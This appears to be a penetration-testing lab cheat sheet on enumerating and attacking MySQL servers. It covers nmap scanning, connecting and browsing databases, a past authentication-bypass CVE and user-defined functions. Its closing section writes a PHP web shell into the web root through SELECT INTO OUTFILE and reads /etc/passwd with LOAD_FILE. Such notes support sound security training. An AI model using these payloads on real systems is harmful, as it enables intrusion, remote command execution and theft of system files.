```
# Nmap
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

# Interaction
mysql -u root -pHello -h 10.129.14.132
```

| **Command**                                          | **Description**                                                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected database.                                                            |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |

`MySQL` also supports different [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can [choose an authentication mode](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.

In the past, there was a vulnerability [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) in `MySQL 5.6.x` servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the `timing attack` vulnerability existed in the way MySQL handled authentication attempts.

`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

**Read and Write Files**

```
# Checking if empty you have access
mysql> show variables like "secure_file_priv";

# Write shell
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

# Read file
mysql> select LOAD_FILE("/etc/passwd");
```


